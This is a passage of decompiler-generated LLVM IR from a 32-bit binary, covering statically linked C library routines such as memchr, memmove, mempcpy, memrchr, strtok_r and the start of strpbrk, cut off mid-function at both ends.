  %v4_8052b50 = add i32 %v3_8052b50, %v2_8052b50
  %v5_8052b50 = inttoptr i32 %v4_8052b50 to i8*
  %v6_8052b50 = load i8, i8* %v5_8052b50, align 1
  %v7_8052b50 = zext i8 %v6_8052b50 to i32
  %v8_8052b50 = load i32, i32* @edx, align 4
  %v9_8052b50 = and i32 %v8_8052b50, -256
  %v10_8052b50 = or i32 %v9_8052b50, %v7_8052b50
  store i32 %v10_8052b50, i32* %edx.global-to-local, align 4
  %v1_8052b54 = add i16 %v2_8052b43, -1
  store i16 %v1_8052b54, i16* %v1_8052b43, align 2
  %v0_8052b5a = load i32, i32* @ebx, align 4
  %v1_8052b5a = add i32 %v0_8052b5a, 40
  %v2_8052b5a = inttoptr i32 %v1_8052b5a to i32*
  store i32 0, i32* %v2_8052b5a, align 4
  %v0_8052b61 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052b61 = urem i32 %v0_8052b61, 256
  store i32 %v1_8052b61, i32* @edx, align 4
  br label %dec_label_pc_8052bdd

dec_label_pc_8052b66:                             ; preds = %dec_label_pc_8052b43
  %v1_8052b66 = add i32 %v2_8052b77, 16
  %v2_8052b66 = inttoptr i32 %v1_8052b66 to i32*
  %v3_8052b66 = load i32, i32* %v2_8052b66, align 4
  store i32 %v3_8052b66, i32* @eax, align 4
  %v1_8052b69 = add i32 %v2_8052b77, 20
  %v2_8052b69 = inttoptr i32 %v1_8052b69 to i32*
  %v3_8052b69 = load i32, i32* %v2_8052b69, align 4
  %v15_8052b69 = icmp eq i32 %v3_8052b69, %v3_8052b66
  %v1_8052b6c = icmp eq i1 %v15_8052b69, false
  br i1 %v1_8052b6c, label %dec_label_pc_8052bb5, label %dec_label_pc_8052b6e

dec_label_pc_8052b6e:                             ; preds = %dec_label_pc_8052b66
  %v1_8052b6e = add i32 %v2_8052b77, 4
  %v2_8052b6e = inttoptr i32 %v1_8052b6e to i32*
  %v3_8052b6e = load i32, i32* %v2_8052b6e, align 4
  %v13_8052b6e = icmp eq i32 %v3_8052b6e, -2
  %v1_8052b72 = icmp eq i1 %v13_8052b6e, false
  br i1 %v1_8052b72, label %dec_label_pc_8052b7c, label %dec_label_pc_8052b74

dec_label_pc_8052b74:                             ; preds = %dec_label_pc_8052b6e
  %v1_8052b74 = or i32 %v3_8052b43, 4
  store i32 %v1_8052b74, i32* @ecx, align 4
  %v1_8052b77 = trunc i32 %v1_8052b74 to i16
  store i16 %v1_8052b77, i16* %v1_8052b43, align 2
  br label %dec_label_pc_8052bda

dec_label_pc_8052b7c:                             ; preds = %dec_label_pc_8052b6e
  %v3_8052b7c = and i16 %v2_8052b43, 768
  %v4_8052b7c = icmp eq i16 %v3_8052b7c, 0
  br i1 %v4_8052b7c, label %dec_label_pc_8052b91, label %dec_label_pc_8052b81

dec_label_pc_8052b81:                             ; preds = %dec_label_pc_8052b7c
  %v3_8052b89 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805a458.163 to i16*))
  %v0_8052b91.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052b91

dec_label_pc_8052b91:                             ; preds = %dec_label_pc_8052b7c, %dec_label_pc_8052b81
  %v0_8052bc6 = phi i32 [ %v2_8052b77, %dec_label_pc_8052b7c ], [ %v0_8052b91.pre, %dec_label_pc_8052b81 ]
  %v1_8052b91 = add i32 %v0_8052bc6, 8
  %v2_8052b91 = inttoptr i32 %v1_8052b91 to i32*
  %v3_8052b91 = load i32, i32* %v2_8052b91, align 4
  %v1_8052b94 = add i32 %v0_8052bc6, 12
  %v2_8052b94 = inttoptr i32 %v1_8052b94 to i32*
  %v3_8052b94 = load i32, i32* %v2_8052b94, align 4
  %v15_8052b94 = icmp eq i32 %v3_8052b94, %v3_8052b91
  br i1 %v15_8052b94, label %dec_label_pc_8052bbe, label %dec_label_pc_8052b99

dec_label_pc_8052b99:                             ; preds = %dec_label_pc_8052b91
  %v2_8052b9c = add i32 %v0_8052bc6, 24
  %v3_8052b9c = inttoptr i32 %v2_8052b9c to i32*
  store i32 %v3_8052b91, i32* %v3_8052b9c, align 4
  %v0_8052b9f = load i32, i32* @ebx, align 4
  %v2_8052ba0 = call i32 @__stdio_rfill(i32 %v0_8052b9f)
  %v1_8052ba8 = icmp eq i32 %v2_8052ba0, 0
  br i1 %v1_8052ba8, label %dec_label_pc_8052bda, label %dec_label_pc_8052bac

dec_label_pc_8052bac:                             ; preds = %dec_label_pc_8052b99
  %v0_8052bac = load i32, i32* @ebx, align 4
  %v1_8052bac = add i32 %v0_8052bac, 20
  %v2_8052bac = inttoptr i32 %v1_8052bac to i32*
  %v3_8052bac = load i32, i32* %v2_8052bac, align 4
  %v2_8052baf = add i32 %v0_8052bac, 24
  %v3_8052baf = inttoptr i32 %v2_8052baf to i32*
  store i32 %v3_8052bac, i32* %v3_8052baf, align 4
  %v0_8052bb2 = load i32, i32* @ebx, align 4
  %v1_8052bb2 = add i32 %v0_8052bb2, 16
  %v2_8052bb2 = inttoptr i32 %v1_8052bb2 to i32*
  %v3_8052bb2 = load i32, i32* %v2_8052bb2, align 4
  br label %dec_label_pc_8052bb5

dec_label_pc_8052bb5:                             ; preds = %dec_label_pc_8052b66, %entry, %dec_label_pc_8052bac
  %v1_8052bb9 = phi i32 [ %v2_8052b77, %dec_label_pc_8052b66 ], [ %v4_8052b0c, %entry ], [ %v0_8052bb2, %dec_label_pc_8052bac ]
  %v0_8052bb5 = phi i32 [ %v3_8052b66, %dec_label_pc_8052b66 ], [ %v3_8052b10, %entry ], [ %v3_8052bb2, %dec_label_pc_8052bac ]
  %v1_8052bb5 = inttoptr i32 %v0_8052bb5 to i8*
  %v2_8052bb5 = load i8, i8* %v1_8052bb5, align 1
  %v3_8052bb5 = zext i8 %v2_8052bb5 to i32
  store i32 %v3_8052bb5, i32* @edx, align 4
  %v1_8052bb8 = add i32 %v0_8052bb5, 1
  %v2_8052bb9 = add i32 %v1_8052bb9, 16
  %v3_8052bb9 = inttoptr i32 %v2_8052bb9 to i32*
  store i32 %v1_8052bb8, i32* %v3_8052bb9, align 4
  %v0_8052be0.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052bdd

dec_label_pc_8052bbe:                             ; preds = %dec_label_pc_8052b91
  %v2_8052bc1 = ptrtoint i8* %stack_var_-5 to i32
  %v5_8052bc6 = inttoptr i32 %v0_8052bc6 to i16*
  %v5_8052bc7 = call i32 @__stdio_READ(i16* %v5_8052bc6, i32 %v2_8052bc1, i32 1)
  %v1_8052bcf = icmp eq i32 %v5_8052bc7, 0
  br i1 %v1_8052bcf, label %dec_label_pc_8052bda, label %dec_label_pc_8052bd3

dec_label_pc_8052bd3:                             ; preds = %dec_label_pc_8052bbe
  %v3_8052bd3 = load i8, i8* %stack_var_-5, align 1
  %v4_8052bd3 = sext i8 %v3_8052bd3 to i32
  store i32 %v4_8052bd3, i32* @edx, align 4
  br label %dec_label_pc_8052bdd

dec_label_pc_8052bda:                             ; preds = %dec_label_pc_8052bbe, %dec_label_pc_8052b99, %dec_label_pc_8052b2b, %dec_label_pc_8052b74
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8052bdd

dec_label_pc_8052bdd:                             ; preds = %dec_label_pc_8052bd3, %dec_label_pc_8052bb5, %dec_label_pc_8052b4b, %dec_label_pc_8052bda
  %v0_8052be0 = phi i32 [ %v4_8052bd3, %dec_label_pc_8052bd3 ], [ %v0_8052be0.pre, %dec_label_pc_8052bb5 ], [ %v1_8052b61, %dec_label_pc_8052b4b ], [ -1, %dec_label_pc_8052bda ]
  store i32 %v0_8052b08, i32* @ebx, align 4
  ret i32 %v0_8052be0

; uselistorder directives
  uselistorder i32 %v0_8052bb5, { 1, 0 }
  uselistorder i32 %v3_8052b91, { 1, 0 }
  uselistorder i32 %v0_8052bc6, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8052b66, { 1, 0, 2 }
  uselistorder i32 %v1_8052b61, { 1, 0 }
  uselistorder i16 %v2_8052b43, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8052b77, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* @global_var_805a4a0.154, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8052bdd, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052bda, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052bb5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052b91, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8052be4 = load i32, i32* @edi, align 4
  store i32 %v0_8052be4, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8052beb = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052beb, i32* %edi.global-to-local, align 4
  %v1_8052bf3 = icmp eq i32 %arg3, 0
  store i1 %v1_8052bf3, i1* %zf.global-to-local, align 1
  br i1 %v1_8052bf3, label %dec_label_pc_8052c03, label %dec_label_pc_8052bf7

dec_label_pc_8052bf7:                             ; preds = %entry
  %v2_8052bf7 = call i32 @_strlen(i8* %arg1)
  %v3_8052bf7 = mul i32 %v2_8052bf7, -1
  %v4_8052bf7 = add i32 %v3_8052bf7, -2
  store i32 %v4_8052bf7, i32* @ecx, align 4
  %v0_8052bf9 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8052bf9, label %dec_label_pc_8052bf7.dec_label_pc_8052c00_crit_edge, label %dec_label_pc_8052bfb

dec_label_pc_8052bf7.dec_label_pc_8052c00_crit_edge: ; preds = %dec_label_pc_8052bf7
  %v0_8052c00.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8052c00.pre, -1
  br label %dec_label_pc_8052c00

dec_label_pc_8052bfb:                             ; preds = %dec_label_pc_8052bf7
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052c00

dec_label_pc_8052c00:                             ; preds = %dec_label_pc_8052bf7.dec_label_pc_8052c00_crit_edge, %dec_label_pc_8052bfb
  %v0_8052c00 = phi i32 [ %phitmp, %dec_label_pc_8052bf7.dec_label_pc_8052c00_crit_edge ], [ 0, %dec_label_pc_8052bfb ]
  %v8_8052c00 = icmp eq i32 %v0_8052c00, 0
  store i1 %v8_8052c00, i1* %zf.global-to-local, align 1
  store i32 %v0_8052c00, i32* %edi.global-to-local, align 4
  %v2_8052c03.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c03

dec_label_pc_8052c03:                             ; preds = %entry, %dec_label_pc_8052c00
  %v0_8052c04 = phi i32 [ 0, %entry ], [ %v0_8052c00, %dec_label_pc_8052c00 ]
  %v2_8052c03 = phi i32 [ %v0_8052be4, %entry ], [ %v2_8052c03.pre, %dec_label_pc_8052c00 ]
  store i32 %v2_8052c03, i32* @edi, align 4
  ret i32 %v0_8052c04

; uselistorder directives
  uselistorder i32 %v0_8052c00, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8052c03, { 1, 0 }
  uselistorder label %dec_label_pc_8052c00, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8052c09 = load i32, i32* @esi, align 4
  store i32 %v0_8052c09, i32* %stack_var_-8, align 4
  %v4_8052c0a = ptrtoint i8* %arg1 to i32
  %v9_8052c16 = icmp ugt i8* %tmp3, %arg1
  %v1_8052c18 = icmp eq i1 %v9_8052c16, false
  br i1 %v1_8052c18, label %dec_label_pc_8052c20, label %dec_label_pc_8052c1a

dec_label_pc_8052c1a:                             ; preds = %entry
  %v7_8052c1c = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8052c2c

dec_label_pc_8052c20:                             ; preds = %entry
  %v3_8052c20 = add i32 %arg2, -1
  %v4_8052c20 = add i32 %v3_8052c20, %tmp
  %v5_8052c20 = inttoptr i32 %v4_8052c20 to i8*
  %v3_8052c24 = add i32 %v4_8052c0a, -1
  %v4_8052c24 = add i32 %v3_8052c24, %tmp
  %v5_8052c24 = inttoptr i32 %v4_8052c24 to i8*
  %v7_8052c29 = call i8* @_memcpy(i8* %v5_8052c24, i8* %v5_8052c20, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8052c2c

dec_label_pc_8052c2c:                             ; preds = %dec_label_pc_8052c1a, %dec_label_pc_8052c20
  %v2_8052c2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052c2c, i32* @esi, align 4
  ret i32 %v4_8052c0a

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052c2c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052c30 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8052c43 = inttoptr i32 %arg1 to i16*
  %v4_8052c43 = call i32 @memcpy(i16* %v3_8052c43, i32 %arg2, i32 %arg3)
  %v0_8052c4b = load i32, i32* @esi, align 4
  %v2_8052c4b = add i32 %v0_8052c4b, %arg3
  store i32 %v0_8052c30, i32* @esi, align 4
  ret i32 %v2_8052c4b
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8052c59 = urem i32 %arg2, 256
  %v4_8052c65 = sext i8 %arg1 to i32
  %v2_8052c69 = add i32 %v4_8052c65, %arg3
  %v1_8052c7b7 = icmp eq i32 %arg3, 0
  br i1 %v1_8052c7b7, label %dec_label_pc_8052c83, label %dec_label_pc_8052c7f

dec_label_pc_8052c6d:                             ; preds = %dec_label_pc_8052c7f
  %v1_8052c6d = add i32 %v0_8052c6d, -1
  %v5_8052c6e = load i32, i32* @edx, align 4
  %v6_8052c6e = and i32 %v5_8052c6e, -256
  %v7_8052c6e = or i32 %v6_8052c6e, %v4_8052c59
  store i32 %v7_8052c6e, i32* @edx, align 4
  %v1_8052c72 = inttoptr i32 %v1_8052c6d to i8*
  %v2_8052c72 = load i8, i8* %v1_8052c72, align 1
  %v15_8052c72 = icmp eq i8 %v2_8052c72, %tmp
  br i1 %v15_8052c72, label %dec_label_pc_8052d00, label %dec_label_pc_8052c7a

dec_label_pc_8052c7a:                             ; preds = %dec_label_pc_8052c6d
  %v1_8052c7a = add i32 %v0_8052c7a, -1
  %v8_8052c7a = icmp eq i32 %v1_8052c7a, 0
  br i1 %v8_8052c7a, label %dec_label_pc_8052c83, label %dec_label_pc_8052c7f

dec_label_pc_8052c7f:                             ; preds = %entry, %dec_label_pc_8052c7a
  %v0_8052c7a = phi i32 [ %v1_8052c7a, %dec_label_pc_8052c7a ], [ %arg3, %entry ]
  %v0_8052c6d = phi i32 [ %v1_8052c6d, %dec_label_pc_8052c7a ], [ %v2_8052c69, %entry ]
  %v2_8052c7f = urem i32 %v0_8052c6d, 4
  %v3_8052c7f = icmp eq i32 %v2_8052c7f, 0
  %v1_8052c81 = icmp eq i1 %v3_8052c7f, false
  br i1 %v1_8052c81, label %dec_label_pc_8052c6d, label %dec_label_pc_8052c83

dec_label_pc_8052c83:                             ; preds = %dec_label_pc_8052c7a, %dec_label_pc_8052c7f, %entry
  %v0_8052ce6.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8052c7a ], [ %v0_8052c7a, %dec_label_pc_8052c7f ]
  %v0_8052c88 = phi i32 [ %v2_8052c69, %entry ], [ %v1_8052c6d, %dec_label_pc_8052c7a ], [ %v0_8052c6d, %dec_label_pc_8052c7f ]
  store i32 %v0_8052c88, i32* @ecx, align 4
  %v2_8052c8c = mul nuw nsw i32 %v4_8052c59, 256
  %v2_8052c8f = or i32 %v2_8052c8c, %v4_8052c59
  %v2_8052c93 = mul i32 %v2_8052c8f, 65536
  %v2_8052c96 = or i32 %v2_8052c93, %v2_8052c8f
  %v6_8052ce955 = icmp ugt i32 %v0_8052ce6.pr, 3
  br i1 %v6_8052ce955, label %dec_label_pc_8052c9a, label %dec_label_pc_8052ceb

dec_label_pc_8052c9a:                             ; preds = %dec_label_pc_8052c83, %dec_label_pc_8052ce3
  %v0_8052ce357 = phi i32 [ %v1_8052ce3, %dec_label_pc_8052ce3 ], [ %v0_8052ce6.pr, %dec_label_pc_8052c83 ]
  %v0_8052c9a56 = phi i32 [ %v1_8052c9a, %dec_label_pc_8052ce3 ], [ %v0_8052c88, %dec_label_pc_8052c83 ]
  %v1_8052c9a = add i32 %v0_8052c9a56, -4
  store i32 %v1_8052c9a, i32* @ecx, align 4
  %v2_8052c9f = inttoptr i32 %v1_8052c9a to i32*
  %v3_8052c9f = load i32, i32* %v2_8052c9f, align 4
  %v4_8052c9f = xor i32 %v3_8052c9f, %v2_8052c96
  %v1_8052ca1 = add i32 %v4_8052c9f, 2130640639
  %v1_8052ca7 = sub i32 -1, %v4_8052c9f
  %v2_8052ca9 = xor i32 %v1_8052ca1, %v1_8052ca7
  %v1_8052cab = and i32 %v2_8052ca9, -2130640640
  %v2_8052cab = icmp eq i32 %v1_8052cab, 0
  br i1 %v2_8052cab, label %dec_label_pc_8052ce3, label %dec_label_pc_8052cb3

dec_label_pc_8052cb3:                             ; preds = %dec_label_pc_8052c9a
  %v7_8052cb3 = or i32 %v1_8052cab, %v4_8052c59
  %v1_8052cb7 = add i32 %v0_8052c9a56, -1
  %v2_8052cba = inttoptr i32 %v1_8052cb7 to i8*
  %v3_8052cba = load i8, i8* %v2_8052cba, align 1
  %v16_8052cba = icmp eq i8 %v3_8052cba, %tmp
  br i1 %v16_8052cba, label %dec_label_pc_8052d00, label %dec_label_pc_8052cbf

dec_label_pc_8052cbf:                             ; preds = %dec_label_pc_8052cb3
  %v1_8052cc3 = add i32 %v0_8052c9a56, -2
  %v2_8052cc6 = inttoptr i32 %v1_8052cc3 to i8*
  %v3_8052cc6 = load i8, i8* %v2_8052cc6, align 1
  %v16_8052cc6 = icmp eq i8 %v3_8052cc6, %tmp
  br i1 %v16_8052cc6, label %dec_label_pc_8052d00, label %dec_label_pc_8052ccb

dec_label_pc_8052ccb:                             ; preds = %dec_label_pc_8052cbf
  %v1_8052ccf = add i32 %v0_8052c9a56, -3
  %v2_8052cd2 = inttoptr i32 %v1_8052ccf to i8*
  %v3_8052cd2 = load i8, i8* %v2_8052cd2, align 1
  %v16_8052cd2 = icmp eq i8 %v3_8052cd2, %tmp
  br i1 %v16_8052cd2, label %dec_label_pc_8052d00, label %dec_label_pc_8052cd7

dec_label_pc_8052cd7:                             ; preds = %dec_label_pc_8052ccb
  %v1_8052cdb = inttoptr i32 %v1_8052c9a to i8*
  %v2_8052cdb = load i8, i8* %v1_8052cdb, align 1
  %v15_8052cdb = icmp eq i8 %v2_8052cdb, %tmp
  %v1_8052cdd = icmp eq i1 %v15_8052cdb, false
  br i1 %v1_8052cdd, label %dec_label_pc_8052ce3, label %dec_label_pc_8052cdf

dec_label_pc_8052cdf:                             ; preds = %dec_label_pc_8052cd7
  br label %dec_label_pc_8052d00

dec_label_pc_8052ce3:                             ; preds = %dec_label_pc_8052cd7, %dec_label_pc_8052c9a
  %v5_8052cf027 = phi i32 [ %v7_8052cb3, %dec_label_pc_8052cd7 ], [ 0, %dec_label_pc_8052c9a ]
  %v1_8052ce3 = add i32 %v0_8052ce357, -4
  %v6_8052ce9 = icmp ugt i32 %v1_8052ce3, 3
  br i1 %v6_8052ce9, label %dec_label_pc_8052c9a, label %dec_label_pc_8052ceb

dec_label_pc_8052ceb:                             ; preds = %dec_label_pc_8052ce3, %dec_label_pc_8052c83
  %v5_8052cf026.lcssa = phi i32 [ %v4_8052c59, %dec_label_pc_8052c83 ], [ %v5_8052cf027, %dec_label_pc_8052ce3 ]
  %v0_8052c9a.lcssa = phi i32 [ %v0_8052c88, %dec_label_pc_8052c83 ], [ %v1_8052c9a, %dec_label_pc_8052ce3 ]
  %v0_8052ce3.lcssa = phi i32 [ %v0_8052ce6.pr, %dec_label_pc_8052c83 ], [ %v1_8052ce3, %dec_label_pc_8052ce3 ]
  br label %dec_label_pc_8052cf8

dec_label_pc_8052cef:                             ; preds = %dec_label_pc_8052cf8
  %v1_8052cf8 = add i32 %v0_8052cf8, -1
  %v1_8052cef = add i32 %v0_8052cef, -1
  %v6_8052cf0 = and i32 %v5_8052cf0, -256
  %v7_8052cf0 = or i32 %v6_8052cf0, %v4_8052c59
  %v1_8052cf4 = inttoptr i32 %v1_8052cef to i8*
  %v2_8052cf4 = load i8, i8* %v1_8052cf4, align 1
  %v15_8052cf4 = icmp eq i8 %v2_8052cf4, %tmp
  br i1 %v15_8052cf4, label %dec_label_pc_8052d00, label %dec_label_pc_8052cf8

dec_label_pc_8052cf8:                             ; preds = %dec_label_pc_8052cef, %dec_label_pc_8052ceb
  %v5_8052cf0 = phi i32 [ %v7_8052cf0, %dec_label_pc_8052cef ], [ %v5_8052cf026.lcssa, %dec_label_pc_8052ceb ]
  %v0_8052cef = phi i32 [ %v1_8052cef, %dec_label_pc_8052cef ], [ %v0_8052c9a.lcssa, %dec_label_pc_8052ceb ]
  %v0_8052cf8 = phi i32 [ %v1_8052cf8, %dec_label_pc_8052cef ], [ %v0_8052ce3.lcssa, %dec_label_pc_8052ceb ]
  %v10_8052cf9 = icmp eq i32 %v0_8052cf8, 0
  %v1_8052cfc = icmp eq i1 %v10_8052cf9, false
  br i1 %v1_8052cfc, label %dec_label_pc_8052cef, label %dec_label_pc_8052cfe

dec_label_pc_8052cfe:                             ; preds = %dec_label_pc_8052cf8
  br label %dec_label_pc_8052d00

dec_label_pc_8052d00:                             ; preds = %dec_label_pc_8052c6d, %dec_label_pc_8052ccb, %dec_label_pc_8052cbf, %dec_label_pc_8052cb3, %dec_label_pc_8052cef, %dec_label_pc_8052cdf, %dec_label_pc_8052cfe
  %v0_8052d03 = phi i32 [ %v1_8052c9a, %dec_label_pc_8052cdf ], [ 0, %dec_label_pc_8052cfe ], [ %v1_8052cef, %dec_label_pc_8052cef ], [ %v1_8052ccf, %dec_label_pc_8052ccb ], [ %v1_8052cc3, %dec_label_pc_8052cbf ], [ %v1_8052cb7, %dec_label_pc_8052cb3 ], [ %v1_8052c6d, %dec_label_pc_8052c6d ]
  ret i32 %v0_8052d03

; uselistorder directives
  uselistorder i32 %v0_8052cf8, { 1, 0 }
  uselistorder i32 %v1_8052ce3, { 0, 2, 1 }
  uselistorder i32 %v1_8052c9a, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8052c9a56, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8052c8f, { 1, 0 }
  uselistorder i32 %v0_8052c6d, { 1, 0, 2 }
  uselistorder i32 %v2_8052c69, { 1, 0 }
  uselistorder i32 %v4_8052c59, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 6, 0, 15, 16, 1, 14, 18, 13, 19, 3, 5, 4, 20, 7, 8, 9, 17, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052d00, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052c9a, { 1, 0 }
  uselistorder label %dec_label_pc_8052c83, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052c7f, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052d04 = load i32, i32* @edi, align 4
  %v0_8052d05 = load i32, i32* @esi, align 4
  %v0_8052d06 = load i32, i32* @ebx, align 4
  store i32 %v0_8052d06, i32* %stack_var_-12, align 4
  %v4_8052d07 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052d07, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8052d13 = icmp eq i8* %arg1, null
  %v1_8052d15 = icmp eq i1 %v1_8052d13, false
  br i1 %v1_8052d15, label %dec_label_pc_8052d19, label %dec_label_pc_8052d17

dec_label_pc_8052d17:                             ; preds = %entry
  %v1_8052d17 = inttoptr i32 %arg3 to i32*
  %v2_8052d17 = load i32, i32* %v1_8052d17, align 4
  store i32 %v2_8052d17, i32* @ebx, align 4
  br label %dec_label_pc_8052d19

dec_label_pc_8052d19:                             ; preds = %entry, %dec_label_pc_8052d17
  %v0_8052d1c = phi i32 [ %v4_8052d07, %entry ], [ %v2_8052d17, %dec_label_pc_8052d17 ]
  %v0_8052d19 = load i32, i32* @ecx, align 4
  %v5_8052d1c = inttoptr i32 %v0_8052d1c to i8*
  %v8_8052d1d = call i32 @__GI_strspn(i8* %v5_8052d1c, i32 %arg2, i32 %v0_8052d19, i32 %v0_8052d19)
  store i32 %v8_8052d1d, i32* %eax.global-to-local, align 4
  %v0_8052d25 = load i32, i32* @ebx, align 4
  %v2_8052d25 = add i32 %v0_8052d25, %v8_8052d1d
  store i32 %v2_8052d25, i32* @ebx, align 4
  %v1_8052d27 = inttoptr i32 %v2_8052d25 to i8*
  %v2_8052d27 = load i8, i8* %v1_8052d27, align 1
  %v3_8052d27 = icmp eq i8 %v2_8052d27, 0
  %v1_8052d2a = icmp eq i1 %v3_8052d27, false
  br i1 %v1_8052d2a, label %dec_label_pc_8052d32, label %dec_label_pc_8052d2c

dec_label_pc_8052d2c:                             ; preds = %dec_label_pc_8052d19
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8052d2e = load i32, i32* @esi, align 4
  %v2_8052d2e = inttoptr i32 %v1_8052d2e to i32*
  store i32 %v2_8052d25, i32* %v2_8052d2e, align 4
  %v0_8052d5c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d59

dec_label_pc_8052d32:                             ; preds = %dec_label_pc_8052d19
  %v0_8052d32 = load i32, i32* @edx, align 4
  %v0_8052d34 = load i32, i32* @edi, align 4
  %v8_8052d36 = call i32 @__GI_strpbrk(i8* %v1_8052d27, i32 %v0_8052d34, i32 %v0_8052d32, i32 %v0_8052d32)
  store i32 %v8_8052d36, i32* %eax.global-to-local, align 4
  %v2_8052d3e = icmp eq i32 %v8_8052d36, 0
  %v1_8052d40 = icmp eq i1 %v2_8052d3e, false
  br i1 %v1_8052d40, label %dec_label_pc_8052d51, label %dec_label_pc_8052d42

dec_label_pc_8052d42:                             ; preds = %dec_label_pc_8052d32
  %v0_8052d46 = load i32, i32* @ebx, align 4
  %v5_8052d46 = inttoptr i32 %v0_8052d46 to i8*
  %v8_8052d47 = call i32 @rawmemchr(i8* %v5_8052d46, i32 0, i32 %v8_8052d36, i32 %v8_8052d36)
  br label %dec_label_pc_8052d55

dec_label_pc_8052d51:                             ; preds = %dec_label_pc_8052d32
  %v9_8052d36 = inttoptr i32 %v8_8052d36 to i8*
  store i8 0, i8* %v9_8052d36, align 1
  %v2_8052d54 = add i32 %v8_8052d36, 1
  br label %dec_label_pc_8052d55

dec_label_pc_8052d55:                             ; preds = %dec_label_pc_8052d42, %dec_label_pc_8052d51
  %storemerge = phi i32 [ %v2_8052d54, %dec_label_pc_8052d51 ], [ %v8_8052d47, %dec_label_pc_8052d42 ]
  %v0_8052d55 = phi i32 [ %v2_8052d54, %dec_label_pc_8052d51 ], [ %v8_8052d47, %dec_label_pc_8052d42 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8052d55 = load i32, i32* @esi, align 4
  %v2_8052d55 = inttoptr i32 %v1_8052d55 to i32*
  store i32 %v0_8052d55, i32* %v2_8052d55, align 4
  %v0_8052d57 = load i32, i32* @ebx, align 4
  store i32 %v0_8052d57, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d59

dec_label_pc_8052d59:                             ; preds = %dec_label_pc_8052d2c, %dec_label_pc_8052d55
  %v0_8052d5c = phi i32 [ %v0_8052d5c.pre, %dec_label_pc_8052d2c ], [ %v0_8052d57, %dec_label_pc_8052d55 ]
  %v2_8052d59 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052d59, i32* @ebx, align 4
  store i32 %v0_8052d05, i32* @esi, align 4
  store i32 %v0_8052d04, i32* @edi, align 4
  ret i32 %v0_8052d5c

; uselistorder directives
  uselistorder i32 %v8_8052d36, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052d59, { 1, 0 }
  uselistorder label %dec_label_pc_8052d55, { 1, 0 }
  uselistorder label %dec_label_pc_8052d19, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052d61 = load i32, i32* @ebx, align 4
  %v2_8052d7825 = load i8, i8* %arg1, align 1
  %v4_8052d7a29 = icmp eq i8 %v2_8052d7825, 0
  br i1 %v4_8052d7a29, label %dec_label_pc_8052d82, label %dec_label_pc_8052d7e.lr.ph

